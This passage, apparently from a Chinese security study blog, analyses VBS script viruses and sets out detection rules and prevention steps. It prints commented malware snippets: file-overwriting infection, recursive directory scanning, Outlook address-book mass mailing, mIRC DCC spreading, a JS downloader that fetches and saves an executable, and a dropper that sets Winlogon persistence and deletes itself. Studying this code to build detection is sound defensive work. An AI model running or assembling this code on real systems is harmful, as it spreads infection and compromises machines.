class=\"comment\">&#x27; 读取病毒全部代码到字符串变量vbscopy……</span></span><br><span class=\"line\">　　<span class=\"keyword\">set</span> ap=fso.opentextfile(目标文件.path,<span class=\"number\">2</span>,<span class=\"literal\">true</span>) <span class=\"comment\">&#x27; 写打开目标文件，准备写入病毒代码</span></span><br><span class=\"line\">　　ap.write vbscopy　　　　　　 <span class=\"comment\">&#x27; 将病毒代码覆盖目标文件</span></span><br><span class=\"line\">　　ap.close</span><br><span class=\"line\">　　<span class=\"keyword\">set</span> cop=fso.getfile(目标文件.path) <span class=\"comment\">&#x27;得到目标文件路径</span></span><br><span class=\"line\">　　cop.copy(目标文件.path &amp; <span class=\"string\">&quot;.vbs&quot;</span>)　 <span class=\"comment\">&#x27; 创建另外一个病毒文件（以.vbs为后缀）</span></span><br><span class=\"line\">　　目标文件.delete(<span class=\"literal\">true</span>)　　　<span class=\"comment\">&#x27;删除目标文件</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\tMD5: xxxxx</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tS1: Set fso=createobject(&quot;scripting.filesystemobject&quot;)    </span><br><span class=\"line\">\t\tS2: set self=fso.opentextfile(wscript.scriptfullname,1)  //需要由action并且执行才能定义为病毒</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpf1=60\t\t\t\t\t// 60 属于低危</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tS3: .write</span><br><span class=\"line\">\t\tS4: .close</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpf1=80\t\t\t\t\t// 60 + 80 </span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tS5: 写，创建，拷贝</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>检测 vbs 方法</p>\n<p>1. 规则建模 + 机器学习</p>\n<p>2. 机器学习中使用 ast 语法树</p>\n<figure class=\"highlight vbscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&#x27;该函数主要用来寻找满足条件的文件，并生成对应文件的一个病毒副本</span></span><br><span class=\"line\">　　<span class=\"keyword\">sub</span> scan(folder_)　　<span class=\"comment\">&#x27;scan函数定义，</span></span><br><span class=\"line\">　　<span class=\"keyword\">on</span> <span class=\"keyword\">error</span> <span class=\"keyword\">resume</span> <span class=\"keyword\">next</span>　　 <span class=\"comment\">&#x27;如果出现错误，直接跳过，防止弹出错误窗口</span></span><br><span class=\"line\">　　<span class=\"keyword\">set</span> folder_=fso.getfolder(folder_)</span><br><span class=\"line\">　　　　 <span class=\"keyword\">set</span> files=folder_.files　　 <span class=\"comment\">&#x27; 当前目录的所有文件集合</span></span><br><span class=\"line\">　　　　 <span class=\"keyword\">for</span> <span class=\"keyword\">each</span> file <span class=\"keyword\">in</span> filesext=fso.GetExtensionName(file)　　<span class=\"comment\">&#x27;获取文件后缀</span></span><br><span class=\"line\">　　　　 ext=<span class=\"built_in\">lcase</span>(ext)　　　 <span class=\"comment\">&#x27;后缀名转换成小写字母</span></span><br><span class=\"line\">　　　　　<span class=\"keyword\">if</span> ext=<span class=\"string\">&quot;mp5&quot;</span> <span class=\"keyword\">then</span>　　<span class=\"comment\">&#x27;如果后缀名是mp5，则进行感染。请自己建立相应后缀名的文件，最好是非正常后缀名 ，以免破坏正常程序。</span></span><br><span class=\"line\">　　　　Wscript.echo (file)</span><br><span class=\"line\">　　　<span class=\"keyword\">end</span> <span class=\"keyword\">if</span></span><br><span class=\"line\">　　<span class=\"keyword\">next</span></span><br><span class=\"line\">　　<span class=\"keyword\">set</span> subfolders=folder_.subfolders</span><br><span class=\"line\">　　<span class=\"keyword\">for</span> <span class=\"keyword\">each</span> subfolder <span class=\"keyword\">in</span> subfolders　　<span class=\"comment\">&#x27;搜索其他目录；递归调用</span></span><br><span class=\"line\">　　　scan( )</span><br><span class=\"line\">　　　scan(subfolder)</span><br><span class=\"line\">　　<span class=\"keyword\">next</span></span><br><span class=\"line\">　　<span class=\"keyword\">end</span> <span class=\"keyword\">sub</span></span><br></pre></td></tr></table></figure>\n<p>一般感染随着服务加载的程序，用 pchunter 查看，做服务替换。感染服务器文件的 PE 节</p>\n<p>上面的代码就是 VBS 脚本病毒进行文件搜索的代码分析。搜索部分 scan ( ) 函数做得比较短小精悍，非常巧妙，采用了一个递归的算法遍历整个分区的目录和文件。</p>\n<p><strong>2．vbs 脚本病毒通过网络传播的几种方式及代码分析</strong></p>\n<p>VBS 脚本病毒之所以传播范围广，主要依赖于它的网络传播功能，一般来说，VBS 脚本病毒采用如下几种方式进行传播：</p>\n<p>​\t\t用 vbs 可以绕过 hips，作为桥接</p>\n<p>1）通过 Email 附件传播</p>\n<p>这是一种用的非常普遍的传播方式，病毒可以通过各种方法拿到合法的 Email 地址，最常见的就是直接取 outlook 地址簿中的邮件地址，也可以通过程序在用户文档（譬如 htm 文件）中搜索 Email 地址。</p>\n<figure class=\"highlight vbscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">　<span class=\"keyword\">Function</span> mailBroadcast()</span><br><span class=\"line\">　　<span class=\"keyword\">on</span> <span class=\"keyword\">error</span> <span class=\"keyword\">resume</span> <span class=\"keyword\">next</span></span><br><span class=\"line\">　　wscript.echo</span><br><span class=\"line\">　　<span class=\"keyword\">Set</span> outlookApp = <span class=\"built_in\">CreateObject</span>(<span class=\"string\">&quot;Outlook.Application&quot;</span>) //创建一个OUTLOOK应用的对象</span><br><span class=\"line\">　　<span class=\"keyword\">If</span> outlookApp= <span class=\"string\">&quot;Outlook&quot;</span> <span class=\"keyword\">Then</span></span><br><span class=\"line\">　　　<span class=\"keyword\">Set</span> mapiObj=outlookApp.GetName<span class=\"built_in\">Space</span>(<span class=\"string\">&quot;MAPI&quot;</span>) //获取MAPI的名字空间</span><br><span class=\"line\">　　　<span class=\"keyword\">Set</span> addrList= mapiObj.AddressLists　　　　　　　　//获取地址表的个数</span><br><span class=\"line\">　　　<span class=\"keyword\">For</span> <span class=\"keyword\">Each</span> addr <span class=\"keyword\">In</span> addrList</span><br><span class=\"line\">　　　<span class=\"keyword\">If</span> addr.AddressEntries.Count &lt;&gt; <span class=\"number\">0</span> <span class=\"keyword\">Then</span></span><br><span class=\"line\">　　 addrEntCount = addr.AddressEntries.Count //获取每个地址表的Email记录数</span><br><span class=\"line\">　　 <span class=\"keyword\">For</span> addrEntIndex= <span class=\"number\">1</span> <span class=\"keyword\">To</span> addrEntCount　　 //遍历地址表的Email地址</span><br><span class=\"line\">　　　　<span class=\"keyword\">Set</span> item = outlookApp.CreateItem(<span class=\"number\">0</span>)　　 //获取一个邮件对象实例</span><br><span class=\"line\">　　　　<span class=\"keyword\">Set</span> addrEnt = addr.AddressEntries(addrEntIndex) //获取具体Email地址</span><br><span class=\"line\">　　　　item.<span class=\"keyword\">To</span> = addrEnt.Address　　　　　　　　　　 //填入收信人地址　　　　item.Subject = <span class=\"string\">&quot;病毒传播实验&quot;</span>　　//写入邮件标题</span><br><span class=\"line\">　　　　item.Body = <span class=\"string\">&quot;这里是病毒邮件传播测试，收到此信请不要慌张！&quot;</span> //写入文件内容</span><br><span class=\"line\">　　　　<span class=\"keyword\">Set</span> attachMents=item.Attachments //定义邮件附件</span><br><span class=\"line\">　　　　attachMents.Add fileSysObj.GetSpecialFolder(<span class=\"number\">0</span>) &amp; <span class=\"string\">&quot;\\test.jpg.vbs&quot;</span></span><br><span class=\"line\">　　　　item.DeleteAfterSubmit = <span class=\"literal\">True</span>　　 //信件提交后自动删除</span><br><span class=\"line\">　　　　<span class=\"keyword\">If</span> item.<span class=\"keyword\">To</span> &lt;&gt; <span class=\"string\">&quot;&quot;</span> <span class=\"keyword\">Then</span></span><br><span class=\"line\">　　　　item.Send　　　　　　　　　　 //发送邮件</span><br><span class=\"line\">　　　　shellObj.regwrite <span class=\"string\">&quot;HKCU\\software\\Mailtest\\mailed&quot;</span>, <span class=\"string\">&quot;1&quot;</span> //病毒标记，以免重复感染</span><br><span class=\"line\">　　　　<span class=\"keyword\">End</span> <span class=\"keyword\">If</span></span><br><span class=\"line\">　　 <span class=\"keyword\">Next</span></span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">If</span></span><br><span class=\"line\"><span class=\"keyword\">Next</span></span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">if</span></span><br><span class=\"line\"><span class=\"keyword\">End</span> <span class=\"keyword\">Function</span></span><br></pre></td></tr></table></figure>\n<p>2）通过局域网共享传播</p>\n<p>局域网共享传播也是一种非常普遍并且有效的网络传播方式。一般来说，为了局域网内交流方便，一定存在不少共享目录，并且具有可写权限，譬如 win2000 创建共享时，默认就是具有可写权限。这样病毒通过搜索这些共享目录，就可以将病毒代码传播到这些目录之中。</p>\n<p>在 VBS 中，有一个对象可以实现网上邻居共享文件夹的搜索与文件操作。我们利用该对象就可以达到传播的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">welcome_msg = &quot;网络连接搜索测试&quot;</span><br><span class=\"line\">Set WSHNetwork = WScript.CreateObject(&quot;WScript.Network&quot;) ’创建一个网络对象</span><br><span class=\"line\">Set oPrinters = WshNetwork.EnumPrinterConnections ’创建一个网络打印机连接列表</span><br><span class=\"line\">WScript.Echo &quot;Network printer mappings:&quot;</span><br><span class=\"line\">For i = 0 to oPrinters.Count - 1 Step 2　　 ’显示网络打印机连接情况</span><br><span class=\"line\">WScript.Echo &quot;Port &quot; &amp; oPrinters.Item(i) &amp; &quot; = &quot; &amp; oPrinters.Item(i+1)</span><br><span class=\"line\">Next</span><br><span class=\"line\">Set colDrives = WSHNetwork.EnumNetworkDrives ’创建一个网络共享连接列表</span><br><span class=\"line\">If colDrives.Count = 0 Then</span><br><span class=\"line\">MsgBox &quot;没有可列出的驱动器。&quot;, vbInformation + vbOkOnly,welcome_msg</span><br><span class=\"line\">Else</span><br><span class=\"line\">strMsg = &quot;当前网络驱动器连接: &quot; &amp; CRLF</span><br><span class=\"line\">For i = 0 To colDrives.Count - 1 Step 2</span><br><span class=\"line\">strMsg = strMsg &amp; Chr(13) &amp; Chr(10) &amp; colDrives(i) &amp; Chr(9) &amp; colDrives(i + 1)</span><br><span class=\"line\">Next</span><br><span class=\"line\">MsgBox strMsg, vbInformation + vbOkOnly, welcome_msg’显示当前网络驱动器连接End If</span><br></pre></td></tr></table></figure>\n<p>上面是一个用来寻找当前打印机连接和网络共享连接并将它们显示出来的完整脚本程序。在知道了共享连接之后，我们就可以直接向目标驱动器读写文件了。</p>\n<p>3）通过感染 htm、asp、jsp、php 等网页文件传播</p>\n<p>如今，WWW 服务已经变得非常普遍，病毒通过感染 htm 等文件，势必会导致所有访问过该网页的用户机器感染病毒。</p>\n<p>病毒之所以能够在 htm 文件中发挥强大功能，采用了和绝大部分网页恶意代码相同的原理。基本上，它们采用了相同的代码，不过也可以采用其它代码，这段代码是病毒 FSO,WSH 等对象能够在网页中运行的关键。在注册表 HKEY_CLASSES_ROOT\\CLSID\\ 下我们可以找到这么一个主键 {F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}，注册表中对它他的说明是 “Windows Script Host Shell Object”，同样，我们也可以找到 {0D43FE01-F093-11CF-8940-00A0C9054228}，注册表对它的说明是 “FileSystem Object”，一般先要对 COM 进行初始化，在获取相应的组件对象之后，病毒便可正确地使用 FSO、WSH 两个对象，调用它们的强大功能。代码如下所示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">　Set Apple0bject = document.applets(&quot;KJ_guest&quot;)</span><br><span class=\"line\">　　Apple0bject.setCLSID(&quot;&#123;F935DC22-1CF0-11D0-ADB9-00C04FD58A0B&#125;&quot;)</span><br><span class=\"line\">　　Apple0bject.createInstance()　　　　　　 ’创建一个实例</span><br><span class=\"line\">　　Set WsShell Apple0bject.Get0bject()</span><br><span class=\"line\">　　Apple0bject.setCLSID(&quot;&#123;0D43FE01-F093-11CF-8940-00A0C9054228&#125;&quot;)</span><br><span class=\"line\">　　Apple0bject.createInstance()　　　　　　 ’创建一个实例</span><br><span class=\"line\">　　Set FSO = Apple0bject.Get0bject()</span><br></pre></td></tr></table></figure>\n<p>4）通过 IRC 聊天通道传播</p>\n<p>病毒通过 IRC 传播一般来说采用以下代码（以 MIRC 为例）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Dim mirc</span><br><span class=\"line\">set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class=\"line\">set mirc=fso.CreateTextFile(&quot;C:\\mirc\\script.ini&quot;) ’创建文件script.ini</span><br><span class=\"line\">fso.CopyFile Wscript.ScriptFullName, &quot;C:\\mirc\\attachment.vbs&quot;, True ’将病毒文件备份到attachment.vbs</span><br><span class=\"line\">mirc.WriteLine &quot;[script]&quot;</span><br><span class=\"line\">mirc.WriteLine &quot;n0=on 1:join:*.*: &#123; if ( $nick !=$me ) &#123;halt&#125; /dcc send $nick C:\\mirc\\attachment.vbs &#125;&quot;</span><br><span class=\"line\">　　　　&#x27;利用命令/ddc send $nick attachment.vbs给通道中的其他用户传送病毒文件</span><br><span class=\"line\">mirc.Close</span><br></pre></td></tr></table></figure>\n<p>2．vbs 脚本病毒的弱点</p>\n<p>vbs 脚本病毒由于其编写语言为脚本，因而它不会像 PE 文件那样方便灵活，它的运行是需要条件的（不过这种条件默认情况下就具备了）。笔者认为，VBS 脚本病毒具有如下弱点：</p>\n<p>1）绝大部分 VBS 脚本病毒运行的时候需要用到一个对象：<strong>FileSystemObject</strong><br>\n　2）VBScript 代码是通过 Windows Script Host 来解释执行的。<br>\n　3）VBS 脚本病毒的运行需要其关联程序 Wscript.exe 的支持。<br>\n　4）通过网页传播的病毒需要 ActiveX 的支持<br>\n　5）通过 Email 传播的病毒需要 OE 的自动发送邮件功能支持，但是绝大部分病毒都是以 Email 为主要传播方式的。</p>\n<p>3．如何预防和解除 vbs 脚本病毒<br>\n　针对以上提到的 VBS 脚本病毒的弱点，笔者提出如下集中防范措施：</p>\n<p>1）禁用文件系统对象 FileSystemObject</p>\n<p>方法：用 regsvr32 scrrun.dll/u 这条命令就可以禁止文件系统对象。其中 regsvr32 是 Windows\\System 下的可执行文件。或者直接查找 scrrun.dll 文件删除或者改名。</p>\n<p>还有一种方法就是在注册表中 HKEY_CLASSES_ROOT\\CLSID\\ 下找到一个主键 {0D43FE01-F093-11CF-8940-00A0C9054228} 的项，咔嚓即可。</p>\n<p>2）卸载 Windows Scripting Host</p>\n<p>在 Windows 98 中（NT 4.0 以上同理），打开［控制面板］→［添加 / 删除程序］→［Windows 安装程序］→［附件］，取消 “Windows Scripting Host” 一项。</p>\n<p>和上面的方法一样，在注册表中 HKEY_CLASSES_ROOT\\CLSID\\ 下找到一个主键 {F935DC22-1CF0-11D0-ADB9-00C04FD58A0B} 的项，咔嚓。</p>\n<p>3）删除 VBS、VBE、JS、JSE 文件后缀名与应用程序的映射点击［我的电脑］→［查看］→［文件夹选项］→［文件类型］，然后删除 VBS、VBE、JS、JSE 文件后缀名与应用程序的映射。</p>\n<p>4）在 Windows 目录中，找到 WScript.exe，更改名称或者删除，如果你觉得以后有机会用到的话，最好更改名称好了，当然以后也可以重新装上。</p>\n<p>5）要彻底防治 VBS 网络蠕虫病毒，还需设置一下你的浏览器。我们首先打开浏览器，单击菜单栏里 “Internet 选项” 安全选项卡里的［自定义级别］按钮。把 “ActiveX 控件及插件” 的一切设为禁用，这样就不怕了。呵呵，譬如新欢乐时光的那个 ActiveX 组件如果不能运行，网络传播这项功能就玩完了。</p>\n<p>6）禁止 OE 的自动收发邮件功能</p>\n<p>7）由于蠕虫病毒大多利用文件扩展名作文章，所以要防范它就不要隐藏系统中已知文件类型的扩展名。Windows 默认的是 “隐藏已知文件类型的扩展名称”，将其修改为显示所有文件类型的扩展名称。</p>\n<p>8）将系统的网络连接的安全级别设置至少为 “中等”，它可以在一定程度上预防某些有害的 Java 程序或者某些 ActiveX 组件对计算机的侵害。</p>\n<h3 id=\"ast语法树\"><a class=\"markdownIt-Anchor\" href=\"#ast语法树\">#</a> AST 语法树</h3>\n<p>文本 -&gt; 抽象语法树的过程</p>\n<p>词法分析：文本 -&gt; token 列表</p>\n<ul>\n<li>去除空格，对 token 分类，去除空格，然后对 token 分类，那些属于语法关键字，那些属于操作符，那些属于语句的截止位置，那些属于数据</li>\n</ul>\n<p>语法分析：token 列表 -&gt; 语法二叉树</p>\n<ul>\n<li>扫描 token 流，然后分析它的语法，这一步应该是分析一条以；结尾的语句具体的执行规则，然后使用逆波兰表达式组合，最后形成一个二叉树，二叉树从底部往上一步步合并</li>\n</ul>\n<p><strong>第一步：词法分析，也叫扫描 scanner</strong> 它读取我们的代码，然后把它们按照预定的规则合并成一个个的标识 tokens。同时，它会移除空白符、注释等。最后，整个代码将被分割进一个 tokens 列表（或者说一维数组）。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"variable\">a</span> <span class=\"operator\">=</span> <span class=\"number\">5</span>;</span><br><span class=\"line\"><span class=\"comment\">// 转换成</span></span><br><span class=\"line\">[&#123;value: <span class=\"string\">&#x27;const&#x27;</span>, type: <span class=\"string\">&#x27;keyword&#x27;</span>&#125;, &#123;value: <span class=\"string\">&#x27;a&#x27;</span>, type: <span class=\"string\">&#x27;identifier&#x27;</span>&#125;, ...]</span><br></pre></td></tr></table></figure>\n<p>当词法分析源代码的时候，它会一个一个字母地读取代码，所以很形象地称之为扫描 - scans。当它遇到空格、操作符，或者特殊符号的时候，它会认为一个话已经完成了。 <strong>第二步：语法分析，也称解析器</strong> 它会将词法分析出来的数组转换成树形的形式，同时，验证语法。语法如果有错的话，抛出语法错误。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[&#123;value: <span class=\"string\">&#x27;const&#x27;</span>, type: <span class=\"string\">&#x27;keyword&#x27;</span>&#125;, &#123;value: <span class=\"string\">&#x27;a&#x27;</span>, type: <span class=\"string\">&#x27;identifier&#x27;</span>&#125;, ...]</span><br><span class=\"line\"><span class=\"comment\">// 语法分析后的树形形式</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   type: <span class=\"string\">&quot;VariableDeclarator&quot;</span>, </span><br><span class=\"line\">   id: &#123;</span><br><span class=\"line\">       type: <span class=\"string\">&quot;Identifier&quot;</span>,</span><br><span class=\"line\">       name: <span class=\"string\">&quot;a&quot;</span></span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">   ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当生成树的时候，解析器会删除一些没必要的标识 tokens（比如：不完整的括号），因此 AST 不是 100% 与源码匹配的。 解析器 100% 覆盖所有代码结构生成树叫做 CST（具体语法树）。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC83MDMwNDU3MDM4ODQwNzkxMDUz\">抽象语法树（AST）入门 - 掘金 (juejin.cn)</span></p>\n<h3 id=\"vbs-脚本解释器\"><a class=\"markdownIt-Anchor\" href=\"#vbs-脚本解释器\">#</a> VBS 脚本解释器</h3>\n<p>windows script host</p>\n<p>wscript.exe</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 1.vbs</span><br><span class=\"line\">wscript.exe -x 1.vbs</span><br><span class=\"line\">Set fso = CreateObject(&quot;scripting.filesystemobject&quot;)</span><br><span class=\"line\">set myfile = fso.CreateTextFile(&quot;C:\\1.txt&quot;,,true)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001193259342.png\" alt=\"image-20231001193259342\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001193409975.png\" alt=\"image-20231001193409975\"></p>\n<h3 id=\"edr-hips\"><a class=\"markdownIt-Anchor\" href=\"#edr-hips\">#</a> EDR &amp; HIPS</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzUzMTQ0NjQ0Nw==\">EDR（终端检测与响应）和传统杀毒软件有什么区别？ - 知乎 (zhihu.com)</span></p>\n<h3 id=\"js-下载器\"><a class=\"markdownIt-Anchor\" href=\"#js-下载器\">#</a> js 下载器</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var objArgs=WScript.Arguments;</span><br><span class=\"line\">var sGet=new ActiveXObject(&quot;ADODB.Stream&quot;);</span><br><span class=\"line\">var xGet=null;</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">xGet=new XMLHttpRequest();</span><br><span class=\"line\">&#125;catch(e)&#123;</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">xGet=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class=\"line\">&#125;catch(ex)&#123;</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">xGet=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class=\"line\">&#125;catch(e3)&#123;</span><br><span class=\"line\">xGet=null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(xGet != null)&#123;</span><br><span class=\"line\">xGet.Open(&quot;GET&quot;,&quot;http://localhost/aplan/mycalc.exe&quot;,0);</span><br><span class=\"line\">xGet.Send();</span><br><span class=\"line\">sGet.Mode=3;</span><br><span class=\"line\">sGet.Type=1;</span><br><span class=\"line\">sGet.Open();</span><br><span class=\"line\">sGet.Write(xGet.ResponseBody);</span><br><span class=\"line\">sGet.SaveToFile(&quot;D:\\\\haha.exe&quot;,2);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>定位：</p>\n<p>var sGet=new ActiveXObject(“ADODB.Stream”);</p>\n<p>xGet=new XMLHttpRequest();</p>\n<p>xGet.Open(“GET”,&quot;&quot;,0);</p>\n<h3 id=\"规则提取与查杀方式\"><a class=\"markdownIt-Anchor\" href=\"#规则提取与查杀方式\">#</a> 规则提取与查杀方式</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dim wsh</span><br><span class=\"line\">set wsh=CreateObject(&quot;WScript.Shell&quot;)</span><br><span class=\"line\">wsh.run &quot;%windir%\\flumasko.exe&quot;,0 //运行木马程序</span><br><span class=\"line\">set sm=Wscript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class=\"line\">sm.RegWrite &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell&quot;,&quot;Explorer.exe %systemroot%\\system32\\winmgmt.exe&quot;</span><br><span class=\"line\">//写进注册表项实现自启动</span><br><span class=\"line\">set WshShell=WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class=\"line\">WScript.Sleep 2000</span><br><span class=\"line\">//等木马的执行完毕</span><br><span class=\"line\">Set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class=\"line\">f=fso.DeleteFile (&quot;flumasko.exe&quot;)</span><br><span class=\"line\">f=fso.DeleteFile (WScript.ScriptName)</span><br></pre></td></tr></table></figure>\n<p>规则：</p>\n<p>模型 A：添加注册表启动</p>\n<p>set wsh=CreateObject(“WScript.Shell”)</p>\n<p>sm.RegWrite “HKLM\\SOFTWARE*”,“Explorer.exe %systemroot%\\system32\\winmgmt.exe”</p>\n<p>规则 B：删除宿主程序</p>\n<p>f=fso.DeleteFile (“flumasko.exe”)<br>\nf=fso.DeleteFile (WScript.ScriptName)</p>\n<h3 id=\"二进制vbs\"><a class=\"markdownIt-Anchor\" href=\"#二进制vbs\">#</a> 二进制 vbs</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;SCRIPT Language=VBScript&gt;&lt;!--DropFileName = &quot;svchost.exe&quot;WriteData = 